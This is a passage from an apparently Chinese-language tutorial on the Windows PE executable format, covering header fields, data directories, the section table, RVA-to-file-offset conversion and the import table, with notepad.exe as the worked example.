IMAGE_FILE_MACHINE_SH3DSP            0x01a3</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_FILE_MACHINE_SH3E              0x01a4  <span class="comment">// SH3E little-endian</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_FILE_MACHINE_SH4               0x01a6  <span class="comment">// SH4 little-endian</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_FILE_MACHINE_SH5               0x01a8  <span class="comment">// SH5</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_FILE_MACHINE_ARM               0x01c0  <span class="comment">// ARM Little-Endian</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_FILE_MACHINE_THUMB             0x01c2  <span class="comment">// ARM Thumb/Thumb-2 Little-Endian</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_FILE_MACHINE_ARMNT             0x01c4  <span class="comment">// ARM Thumb-2 Little-Endian</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_FILE_MACHINE_AM33              0x01d3</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_FILE_MACHINE_POWERPC           0x01F0  <span class="comment">// IBM PowerPC Little-Endian</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_FILE_MACHINE_POWERPCFP         0x01f1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_FILE_MACHINE_IA64              0x0200  <span class="comment">// Intel 64</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_FILE_MACHINE_MIPS16            0x0266  <span class="comment">// MIPS</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_FILE_MACHINE_ALPHA64           0x0284  <span class="comment">// ALPHA64</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_FILE_MACHINE_MIPSFPU           0x0366  <span class="comment">// MIPS</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_FILE_MACHINE_MIPSFPU16         0x0466  <span class="comment">// MIPS</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_FILE_MACHINE_AXP64             IMAGE_FILE_MACHINE_ALPHA64</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_FILE_MACHINE_TRICORE           0x0520  <span class="comment">// Infineon</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_FILE_MACHINE_CEF               0x0CEF</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_FILE_MACHINE_EBC               0x0EBC  <span class="comment">// EFI Byte Code</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_FILE_MACHINE_AMD64             0x8664  <span class="comment">// AMD64 (K8)</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_FILE_MACHINE_M32R              0x9041  <span class="comment">// M32R little-endian</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_FILE_MACHINE_CEE               0xC0EE</span></span><br></pre></td></tr></table></figure><p>NumberOfSections：指出节区数量，该值一定大与0，且当定义的节区数量与直接情况不同时，将发生运行错误。<br>SizeOfOptionalHeader：因为PE32+格式的文件使用的是IMAGE_OPTIONAL_HEADER64而非IMAGE_OPTIONAL_HEADER32，所以要指明可选头结构体大小。<br>Characteristics：该字段用于标识文件的属性（是否为可运行的形态，是否为dll等等）。需要记住0x0002为exe，0x2000为dll</p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210306223659.png" alt="20200127182939473"></p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="number">014</span>CWORD    Machine;<span class="comment">//运行平台</span></span><br><span class="line"><span class="number">0003</span>WORD    NumberOfSections;<span class="comment">//文件的节区数目</span></span><br><span class="line"><span class="number">48025287</span>DWORD   TimeDateStamp;<span class="comment">//文件创建日期和时间</span></span><br><span class="line"><span class="number">00000000</span>DWORD   PointerToSymbolTable;<span class="comment">//指向符号表（用于调试）</span></span><br><span class="line"><span class="number">00000000</span>DWORD   NumberOfSymbols;<span class="comment">//符号表中符号个数（用于调试）</span></span><br><span class="line"><span class="number">00E0</span>WORD    SizeOfOptionalHeader;<span class="comment">//IMAGE_OPTIONAL_HEADER32结构大小</span></span><br><span class="line"><span class="number">010F</span>WORDCharacteristics;<span class="comment">//文件属性</span></span><br></pre></td></tr></table></figure><h3 id="OptionalHeader字段：可选头"><a href="#OptionalHeader字段：可选头" class="headerlink" title="OptionalHeader字段：可选头"></a>OptionalHeader字段：可选头</h3><p>IMAGE_OPTIONAL_HEADER（可选头），因为文件头不足以定义PE文件属性，因此可选头中定义了更多的数据。总共224个字节，最后128个字节为数据目录（Data Directory），其结构如下：</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_OPTIONAL_HEADER</span> &#123;</span></span><br><span class="line">    WORD    Magic;<span class="comment">//标志字，32为10B，64为20B</span></span><br><span class="line">    BYTE    MajorLinkerVersion;<span class="comment">//链接器主版本号</span></span><br><span class="line">    BYTE    MinorLinkerVersion;<span class="comment">//链接器次版本号</span></span><br><span class="line">    DWORD   SizeOfCode;<span class="comment">//所有含有代码表的总大小</span></span><br><span class="line">    DWORD   SizeOfInitializedData;<span class="comment">//所有初始化数据表总大小</span></span><br><span class="line">    DWORD   SizeOfUninitializedData;<span class="comment">//所有未初始化数据表总大小</span></span><br><span class="line">    DWORD   AddressOfEntryPoint;<span class="comment">//程序执行入口RVA</span></span><br><span class="line">    DWORD   BaseOfCode;<span class="comment">//代码表其实RVA</span></span><br><span class="line">    DWORD   BaseOfData;<span class="comment">//数据表其实RVA</span></span><br><span class="line">    DWORD   ImageBase;<span class="comment">//程序默认装入基地址</span></span><br><span class="line">    DWORD   SectionAlignment;<span class="comment">//内存中表的对齐值</span></span><br><span class="line">    DWORD   FileAlignment;<span class="comment">//文件中表的对齐值</span></span><br><span class="line">    WORD    MajorOperatingSystemVersion;        <span class="comment">//操作系统主版本号</span></span><br><span class="line">    WORD    MinorOperatingSystemVersion;        <span class="comment">//操作系统次版本号</span></span><br><span class="line">    WORD    MajorImageVersion;<span class="comment">//用户自定义主版本号</span></span><br><span class="line">    WORD    MinorImageVersion;<span class="comment">//用户自定义次版本号</span></span><br><span class="line">    WORD    MajorSubsystemVersion;<span class="comment">//所需要子系统主版本号</span></span><br><span class="line">    WORD    MinorSubsystemVersion;<span class="comment">//所需要子系统次版本号</span></span><br><span class="line">    DWORD   Win32VersionValue;<span class="comment">//保留，通常设置为0</span></span><br><span class="line">    DWORD   SizeOfImage;<span class="comment">//映像装入内存后的总大小</span></span><br><span class="line">    DWORD   SizeOfHeaders;<span class="comment">//DOS头、PE头、节区表总大小</span></span><br><span class="line">    DWORD   CheckSum;<span class="comment">//映像校验和</span></span><br><span class="line">    WORD    Subsystem;<span class="comment">//文件子系统</span></span><br><span class="line">    WORD    DllCharacteristics;<span class="comment">//显示DLL特性的旗标</span></span><br><span class="line">    DWORD   SizeOfStackReserve;<span class="comment">//初始化堆栈大小</span></span><br><span class="line">    DWORD   SizeOfStackCommit;<span class="comment">//初始化实际提交堆栈大小</span></span><br><span class="line">    DWORD   SizeOfHeapReserve;<span class="comment">//初始化保留堆栈大小</span></span><br><span class="line">    DWORD   SizeOfHeapCommit;<span class="comment">//初始化实际保留堆栈大小</span></span><br><span class="line">    DWORD   LoaderFlags;<span class="comment">//与调试相关，默认值为0</span></span><br><span class="line">    DWORD   NumberOfRvaAndSizes;<span class="comment">//数据目录表的项数</span></span><br><span class="line">    IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES];</span><br><span class="line">&#125; IMAGE_OPTIONAL_HEADER32, *PIMAGE_OPTIONAL_HEADER32;</span><br></pre></td></tr></table></figure><p>Magic：32位为10B，64位为20B</p><p>AddressOfEntryPoint：持有EP的RVA相当重要！</p><p>ImageBase：指出文件优先装入的地址。exe，dll文件被装载用户内存的0<del>7FFFFFFF中，sys文件被载入内核内存80000000</del>FFFFFFFF中。exe默认0x400000，dll默认0x100000。执行PE文件时，PE装载器先创建进程，再将文件载入内存，然后将EIP的值设为ImageBase+AddresssOfEntryPoint。</p><p>SectionAlignment，FileAlignment：SectionAlignment节区在内存的最小单位，FileAlignment表示节区在磁盘的最小单位。两个值可以相同可以不同。</p><p>SizeOfImage：将PE文件加载到内存的时候，SizeOfImage指出了内存中所占大小，这与磁盘里面的大小是不一样的哦。</p><p>SizeOfHeader：指出整个PE头的大小。其值必须为FileAlignment的整数倍。第一节区所在位置必须与SizeOfHeader据文件开头的偏移的量相同。</p><p>Subsystem：用来区分系统驱动文件*.sys和用户可执行文件*.exe，*.dll</p><p>NumberOfRvaAndSizes：用来指定DataDirectory数组的个数。</p><p>DataDirectory：<br>DataDirectory是OptionalHeader可选头的最后128个字节，也是IMAGE_NT_HEADERSPE头的最后一部分数据。它由16个IMAGE_DATA_DIRECTORY结构组成的数组构成，指向输出表、输入表、资源块等数据。IMAGE_DATA_DIRECTORY的结构如下：</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_DATA_DIRECTORY</span> &#123;</span></span><br><span class="line">    DWORD   VirtualAddress;<span class="comment">//数据块的起始RVA</span></span><br><span class="line">    DWORD   Size;<span class="comment">//数据块的长度</span></span><br><span class="line">&#125; IMAGE_DATA_DIRECTORY, *PIMAGE_DATA_DIRECTORY;</span><br></pre></td></tr></table></figure><p>16个数据表（<strong>DataDirectory</strong>）成员结构如下：</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_DIRECTORY_ENTRY_EXPORT             <span class="comment">// Export Directory</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_DIRECTORY_ENTRY_IMPORT             <span class="comment">// Import Directory</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_DIRECTORY_ENTRY_RESOURCE           <span class="comment">// Resource Directory</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_DIRECTORY_ENTRY_EXCEPTION          <span class="comment">// Exception Directory</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_DIRECTORY_ENTRY_SECURITY           <span class="comment">// Security Directory</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_DIRECTORY_ENTRY_BASERELOC          <span class="comment">// Base Relocation Table</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_DIRECTORY_ENTRY_DEBUG              <span class="comment">// Debug Directory</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_DIRECTORY_ENTRY_COPYRIGHT          <span class="comment">// (X86 usage)</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_DIRECTORY_ENTRY_ARCHITECTURE       <span class="comment">// Architecture Specific Data</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_DIRECTORY_ENTRY_GLOBALPTR          <span class="comment">// RVA of GP</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_DIRECTORY_ENTRY_TLS                <span class="comment">// TLS Directory</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG        <span class="comment">// Load Configuration Directory</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT       <span class="comment">// Bound Import Directory in headers</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_DIRECTORY_ENTRY_IAT                <span class="comment">// Import Address Table</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_DIRECTORY_ENTRY_DELAY_IMPORT       <span class="comment">// Delay Load Import Descriptors</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR     <span class="comment">// COM Runtime descriptor</span></span></span><br></pre></td></tr></table></figure><p>重点关注Export Directory，Import Directory，Resource Directory，TLS Directory，尤其是Export和Import，重中之重！！之后会单独将其列出来讲解。<br>好了，介绍完重要成员过后我们来看看notepad.exe的IMAGE_OPTIONAL_HEADER.</p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210306223845.png" alt="20200127183509509"></p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="number">010B</span>WORD    Magic;<span class="comment">//标志字，32为10B，64为20B</span></span><br><span class="line"><span class="number">07</span>BYTE    MajorLinkerVersion;<span class="comment">//链接器主版本号</span></span><br><span class="line"><span class="number">0</span>ABYTEMinorLinkerVersion;<span class="comment">//链接器次版本号</span></span><br><span class="line"><span class="number">00007800</span>DWORD   SizeOfCode;<span class="comment">//所有含有代码表的总大小</span></span><br><span class="line"><span class="number">00008800</span>DWORD   SizeOfInitializedData;<span class="comment">//所有初始化数据表总大小</span></span><br><span class="line"><span class="number">00000000</span>DWORD   SizeOfUninitializedData;<span class="comment">//所有未初始化数据表总大小</span></span><br><span class="line"><span class="number">0000739</span>DDWORD   AddressOfEntryPoint;<span class="comment">//程序执行入口RVA</span></span><br><span class="line"><span class="number">00001000</span>DWORD   BaseOfCode;<span class="comment">//代码表其实RVA</span></span><br><span class="line"><span class="number">00009000</span>DWORD   BaseOfData;<span class="comment">//数据表其实RVA</span></span><br><span class="line"><span class="number">01000000</span>DWORD   ImageBase;<span class="comment">//程序默认装入基地址</span></span><br><span class="line"><span class="number">00001000</span>DWORD   SectionAlignment;<span class="comment">//内存中表的对齐值</span></span><br><span class="line"><span class="number">00000200</span>DWORD   FileAlignment;<span class="comment">//文件中表的对齐值</span></span><br><span class="line"><span class="number">0005</span>WORD    MajorOperatingSystemVersion;    <span class="comment">//操作系统主版本号</span></span><br><span class="line"><span class="number">0001</span>WORD    MinorOperatingSystemVersion;    <span class="comment">//操作系统次版本号</span></span><br><span class="line"><span class="number">0005</span>WORD    MajorImageVersion;<span class="comment">//用户自定义主版本号</span></span><br><span class="line"><span class="number">0001</span>WORD    MinorImageVersion;<span class="comment">//用户自定义次版本号</span></span><br><span class="line"><span class="number">0004</span>WORD    MajorSubsystemVersion;<span class="comment">//所需要子系统主版本号</span></span><br><span class="line"><span class="number">0000</span>WORD    MinorSubsystemVersion;<span class="comment">//所需要子系统次版本号</span></span><br><span class="line"><span class="number">00000000</span>DWORD   Win32VersionValue;<span class="comment">//保留，通常设置为0</span></span><br><span class="line"><span class="number">00013000</span>DWORD   SizeOfImage;<span class="comment">//映像装入内存后的总大小</span></span><br><span class="line"><span class="number">00000400</span>DWORD   SizeOfHeaders;<span class="comment">//DOS头、PE头、区块表总大小</span></span><br><span class="line"><span class="number">00018</span>ADADWORD   CheckSum;<span class="comment">//映像校验和</span></span><br><span class="line"><span class="number">0002</span>WORD    Subsystem;<span class="comment">//文件子系统</span></span><br><span class="line"><span class="number">8000</span>WORD    DllCharacteristics;<span class="comment">//显示DLL特性的旗标</span></span><br><span class="line"><span class="number">00040000</span>DWORD   SizeOfStackReserve;<span class="comment">//初始化堆栈大小</span></span><br><span class="line"><span class="number">00011000</span>DWORD   SizeOfStackCommit;<span class="comment">//初始化实际提交堆栈大小</span></span><br><span class="line"><span class="number">00100000</span>DWORD   SizeOfHeapReserve;<span class="comment">//初始化保留堆栈大小</span></span><br><span class="line"><span class="number">00001000</span>DWORD   SizeOfHeapCommit;<span class="comment">//初始化实际保留堆栈大小</span></span><br><span class="line"><span class="number">00000000</span>DWORD   LoaderFlags;<span class="comment">//与调试相关，默认值为0</span></span><br><span class="line"><span class="number">00000010</span>DWORD   NumberOfRvaAndSizes;<span class="comment">//数据目录表的项数</span></span><br><span class="line"><span class="number">00000000</span>RVA of EXPORT Directory</span><br><span class="line"><span class="number">00000000</span>size of EXPORT Directory</span><br><span class="line"><span class="number">00007604</span>RVA of IMPORT Directory</span><br><span class="line"><span class="number">000000</span>C8size of IMPORT Directory</span><br><span class="line"><span class="number">0000B</span>000RVA of RESOURCE Directory</span><br><span class="line"><span class="number">00007F</span>20size of RESOURCE Directory</span><br><span class="line"><span class="number">00000000</span>RVA of EXCEPTION Directory</span><br><span class="line"><span class="number">00000000</span>size of EXCEPTION Directory</span><br><span class="line"><span class="number">00000000</span>RVA of SECURITY Directory</span><br><span class="line"><span class="number">00000000</span>size of SECURITY Directory</span><br><span class="line"><span class="number">00000000</span>RVA of BASERELOC Directory</span><br><span class="line"><span class="number">00000000</span>size of BASERELOC Directory</span><br><span class="line"><span class="number">00001350</span>RVA of DEBUG Directory</span><br><span class="line"><span class="number">0000001</span>Csize of DEBUG Directory</span><br><span class="line"><span class="number">00000000</span>RVA of COPYRIGHT Directory</span><br><span class="line"><span class="number">00000000</span>size of COPYRIGHT Directory</span><br><span class="line"><span class="number">00000000</span>RVA of GLOBALPTR Directory</span><br><span class="line"><span class="number">00000000</span>size of GLOBALPTR Directory</span><br><span class="line"><span class="number">00000000</span>RVA of TLS Directory</span><br><span class="line"><span class="number">00000000</span>size of TLS Directory</span><br><span class="line"><span class="number">000018</span>A8RVA of LOAD_CONFIG Directory</span><br><span class="line"><span class="number">00000040</span>size of LOAD_CONFIG Directory</span><br><span class="line"><span class="number">00000250</span>RVA of BOUND_IMPORT Directory</span><br><span class="line"><span class="number">000000</span>D0size of BOUND_IMPORT Directory</span><br><span class="line"><span class="number">00001000</span>RVA of IAT Directory</span><br><span class="line"><span class="number">00000348</span>size of IAT Directory</span><br><span class="line"><span class="number">00000000</span>RVA of DELAY_IMPORT Directory</span><br><span class="line"><span class="number">00000000</span>size of DELAY_IMPORT Directory</span><br><span class="line"><span class="number">00000000</span>RVA of COM_DESCRIPTOR Directory</span><br><span class="line"><span class="number">00000000</span>size of COM_DESCRIPTOR Directory</span><br><span class="line"><span class="number">00000000</span>RVA of Reserve Directory</span><br><span class="line"><span class="number">00000000</span>size of Reserve Directory</span><br></pre></td></tr></table></figure><h2 id="节区表"><a href="#节区表" class="headerlink" title="节区表"></a>节区表</h2><p>在PE文件头与原始数据之间存在一个节区表（Section Table），其实就相当于每本书前面的目录，它是一个IMAGE_SECTION_HEADER结构数组，节区表包含每个节区在映像中的信息（如位置、长度、属性），分别指向不同的节区实体。全部有效结构的最后以一个NULL的IMAGE_SECTION_HEADER结构作为结束，所以节区表中总的IMAGE_SECTION_HEADER结构数量总比节的数量多一个。另外，节区表中 IMAGE_SECTION_HEADER 结构的总数总是由FileHeader里面的NumberOfSections 字段来指定的。</p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210306223917.png" alt="2020012718362165"></p><p>IMAGE_SECTION_HEADER结构定义如下：</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_SECTION_HEADER</span> &#123;</span></span><br><span class="line">    Name<span class="comment">//8个字节的节区名</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">        DWORD PhysicalAddress;</span><br><span class="line">        DWORD VirtualSize;</span><br><span class="line">    &#125; Misc;                         <span class="comment">//节区尺寸&lt;/span&gt;</span></span><br><span class="line">    DWORD VirtualAddress;<span class="comment">//节区的RVA地址</span></span><br><span class="line">    DWORD SizeOfRawData;<span class="comment">//在文件中对齐后的尺寸</span></span><br><span class="line">    DWORD PointerToRawData;<span class="comment">//在文件中偏移</span></span><br><span class="line">    DWORD PointerToRelocations;<span class="comment">//在OBJ文件中使用，重定位的偏移</span></span><br><span class="line">    DWORD PointerToLinenumbers;<span class="comment">//行号表的偏移（供调试使用地）</span></span><br><span class="line">    WORD NumberOfRelocations;<span class="comment">//在OBJ文件中使用，重定位项数目</span></span><br><span class="line">    WORD NumberOfLinenumbers;<span class="comment">//行号表中行号的数目</span></span><br><span class="line">    DWORD Characteristics;<span class="comment">//节区属性如可读，可写，可执行等</span></span><br><span class="line">&#125; IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER;</span><br></pre></td></tr></table></figure><p>Name：这是一个8位的ASCII(不是Unicode内码)，用来定义节区名，多数节区名以“.”开始(如.Text)，这个实际上不是必需的，注意如果块名超过了8个字节，则没有最后面的终止标志NULL字节，带有$的节区的名字会从编译器里将带有$的相同名字的区块被按字母顺序合并。<br>VirtualSize：指出实际的，被使用的节区大小，是节区在没有对齐处理前的实际大小。<br>VirtualAddress：该块是装载到内存中的RVA，这个地址是按内存页对齐的，总是OptionalHeader里SectionAlignment的整数倍，第一个块默认RVA为1000。<br>SizeofRawData：该块在磁盘中所占的大小,在可执行文件中，该字段包括经过OptionalHeader里FileAlignment调整后块的长度。例如FileAlignment的大小为200h，如果VirtualSize中的块长度为19Ah个字节，这一块保存的长度为200h个字节。<br>PointerToRawData：该块是在磁盘文件中的偏移，程序编译或汇编后生成原始数据，这个字段用于给出原始数据块在文件的偏移，如果程序自装载PE或COFF文件（而不是由OS装载），这种情况，必须完全使用线性映像方法装入文件，需要在该块处找到块的数据。<br>PointerToRelocations 在PE中无意义<br>PointerToLinenumbers 行号表在文件中的偏移值，文件调试的信息<br>NumberOfRelocations 在PE中无意义<br>NumberOfLinenumbers 该节区在行号表中的行号数目<br>Characteristics 节区属性,(如代码/数据/可读/可写)的标志，这个值可通过链接器的/SECTION选项设置.下面是比较重要的标志：<br>节区名称以及意义：</p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210306224008.png" alt="20200127183821255"></p><p>每个节区的名称都是唯一的，不能有同名的两个节区。但事实上节的名称不代表任何含义，其存在仅仅是为了正规统一编程的时候方便程序员查看方便而设置的一个标记而已。所以将包含代码的节区命名为“.Data” 或者说将包含数据的节区命名为“.Code” 都是合法的。当我们要从PE 文件中读取需要的节区时候，不能以节区的名称作为定位的标准和依据，正确的方法是按照 IMAGE_OPTIONAL_HEADER32 结构中的数据目录字段结合进行定位。</p><p>在Visual C++中，用#pragma来声明，告诉编译器插入数据到一个节区内：</p><p>#pragma data_seg(“MY_DATA”)</p><p>链接器能够合并节区。如果两个节区有相似、一致性的属性，那么它们在链接的时候能被合并成一个单一的节区。这取决于是否开启编译器的 /merge 开关。下面的链接器选项将.rdata与.text节区合并为一个.text节区：</p><p>/MERGE : .rdata = .text</p><p>注意：当合并节区时，因为这没有什么硬性规定。例如，把.rdata合并到.text里不会有什么问题，但是不应该将.rsrc、.reloc或者.pdata合并到其它的节区里。</p><h3 id="节区的对齐"><a href="#节区的对齐" class="headerlink" title="节区的对齐"></a>节区的对齐</h3><p>节区大小是要对齐的，有两种对齐值，一种用于磁盘文件内，另一种用于内存中。PE文件头指出了这两个值，他们可以不同。<br>OptionalHeader里边的FileAligment 定义了磁盘节区的对齐值。每一个节区从对齐值的倍数的偏移位置开始存放。而节区的实际代码或数据的大小不一定刚好是这么多，所以在多余的地方一般以00h 来填充，这就是节区间的间隙。例如，在PE文件中，一个典型的对齐值是200h ，这样，每个区块都将从200h 的倍数的文件偏移位置开始，假设第一个区块在400h 处，长度为90h，那么从文件400h 到490h 为这一节区的内容，而由于文件的对齐值是200h，所以为了使这一节区的长度为FileAlignment 的整数倍，490h 到 600h 这一个区间都会被00h 填充，这段空间称为区块间隙，下一个节区的开始地址为600h 。</p><p>OptionalHeader里边的SectionAligment 定义了内存中节区的对齐值。PE 文件被映射到内存中时，节区总是至少从一个页边界开始。一般在X86 系列的CPU 中，页是按4KB（1000h）来排列的。</p><h3 id="文件偏移与RVA"><a href="#文件偏移与RVA" class="headerlink" title="文件偏移与RVA"></a>文件偏移与RVA</h3><p>由于一些PE文件为减少体积，磁盘对齐值不是一个内存页1000h，而是 200h，当这类文件被映射到内存后，由于内存里面的对齐值一般是1000h，同一数据相对于文件头的偏移量在内存中和磁盘文件中是不同的，这样就存在着文件偏移地址与虚拟地址的转换问题。<br>文件被映射到内存，DOS文件头，PE文件头，区块表的偏移位置和大小都没有发生改变。而各区块映射到内存后，起偏移位置发生了改变。<br>文件被映射到内存称之为RVA to RAW。</p><h2 id="RVA-to-RAW"><a href="#RVA-to-RAW" class="headerlink" title="RVA to RAW."></a>RVA to RAW.</h2><p>就是PE文件从磁盘映射到内存，每个区块都要准确无误地完成文件偏移到内存地址的映射。<br>RAW - PointerToRawDate = RVA - VirtualAddress<br>RAW = RVA - VirtualAddress + PointerToRawDate</p><p>看看《逆向工程核心原理》上的例子：</p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210306224104.png" alt="20200127184202675"></p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210306224117.png" alt="20200127184223116"></p><h2 id="IAT-Import-Address-Table"><a href="#IAT-Import-Address-Table" class="headerlink" title="IAT(Import Address Table)"></a>IAT(Import Address Table)</h2><h3 id="dll"><a href="#dll" class="headerlink" title="dll"></a>dll</h3><p>先介绍一下DLL（Dynamic Linked Library）的概念，中文翻译为动态链接库，它是Windows的根基。32位才引入这一概念。Windows操作系统使用数量庞大的库函数，而且支持多进程，若像以前一样每个程序运行都包含相同的库，将造成严重的内存浪费和磁盘浪费。在此背景下，Windows的设计师们引入DLL这一概念。优点很明显：<br>将库函数单独组成DLL文件，需要时再调用。<br>更新库时只需要更新对应的DLL文件，避免每次更新不必要的资源。<br>内存映射技术使得加载过后的DLL代码可以在多进程中使用。<br>加载DLL的方式有两种，一种是“显式链接”（Explicit Linking），程序使用DLL时再加载，使用完毕过后释放内存；另外一种是“隐式链接”（Implicit Linking），程序开始就一起加载DLL，程序终止时再释放内存。IAT与后者相关。</p><h3 id="IAMGE-IMPORT-DESCRITPTOR"><a href="#IAMGE-IMPORT-DESCRITPTOR" class="headerlink" title="IAMGE_IMPORT_DESCRITPTOR"></a>IAMGE_IMPORT_DESCRITPTOR</h3><p>IAMGE_IMPORT_DESCRITPTOR（也被称为IMPORT Directory Table）<br>IID（ IAMGE_IMPORT_DESCRITPTOR）结构体中记录着PE文件要导入哪些库文件。导入多少库就有多少个IID，这些IID形成结构体数组，最后以NULL结构体结束。<br>IID的结构如下：</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">STRUCT IAMGE_IMPORT_DESCRIPTOR</span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">        DWORD Characteristics;</span><br><span class="line">        DWORD OriginalFirstThunk; <span class="comment">//指向输入名称表（INT）的RVA，未指明大小，以NULL结束</span></span><br><span class="line">    &#125;</span><br><span class="line">    DWORD TimeDateStamp;          <span class="comment">//一个32位的时间标志</span></span><br><span class="line">    DWORD ForwarderChain;         <span class="comment">//这是一个被转向API的索引，一般为0</span></span><br><span class="line">    DWORD Name;                  <span class="comment">//DLL名字,是个以00结尾的ASCII字符的RVA地址</span></span><br><span class="line">    DWORD FirstThunk;            <span class="comment">//指向输入地址表（IAT）的RVA，未指明大小，以NULL结束</span></span><br><span class="line">&#125; ;</span><br></pre></td></tr></table></figure><p>以下是IID结构体重要成员</p><table><thead><tr><th>OriginalFirstThunk</th><th>INT（Import Name Table）地址(RVA)</th></tr></thead><tbody><tr><td>Name</td><td>库名字字符串地址（RVA）</td></tr><tr><td>FirstThunk</td><td>IAT（Import Address Table）地址（RVA）</td></tr></tbody></table><p>好了现在讲解一下PE装载器是如何把导入函数输入IAT顺序：</p><p>读取IID的Name成员，获取库名称字符串，比如说kernel32.dll<br>利用LoadLibrary装载库kernel32.dll<br>读取IID的OriginalFirstThunk成员获取INT地址<br>逐一读取INT中数组的值，获取相应IMAGEZ_IMPORT_BY_NAME地址（RVA）<br>使用IMAGEZ_IMPORT_BY_NAME的Hint或者Name项获取相应函数的起始地址。<br>—&gt;GetProcAddress(“GetCurrentThreadld”)<br>读取IID的FirstThunk获取IAT地址<br>现在有个问题，IID结构体在哪呢？它不在PE头而在PE体，但查找其位置的信息就位于IMAGE_OPTIONAL_HEADER32.DataDirectory[1]中，VirtualAddress的值就是IID的RVA。<br>为了方便查看，我们列出前三个成员</p><p>RVA of EXPORT Directory<br>size of EXPORT Directory<br>RVA of IMPORT Directory<br>size of IMPORT Directory<br>RVA of RESOURCE Directory<br>size of RESOURCE Directory<br>现在是不是已经晕头转向了，没关系，我们将以notepad.exe演示一遍。</p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210306224244.png" alt="20200127185034224"></p><p>如图所示，RVA是7604，计算偏移为7604-1000+400=6A04。此处即为IAMGE_IMPORT_DESCRITPTOR数组的所有成员，IID数组大小未定，但是最后以NULL结束，前五个框上的即为数组第一个结构体的五个成员。</p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210306224301.png" alt="20200127185057480"></p><p>我们将其重要成员列出来：</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">RVA成员             RAW</span><br><span class="line"><span class="number">00007990</span>OriginalFirstThunk(INT)<span class="number">00006</span>D90</span><br><span class="line"><span class="number">00007</span>AACName       <span class="number">00006</span>EAC</span><br><span class="line"><span class="number">000012</span><span class="function">C4<span class="title">FirstThunk</span><span class="params">(IAT)</span>    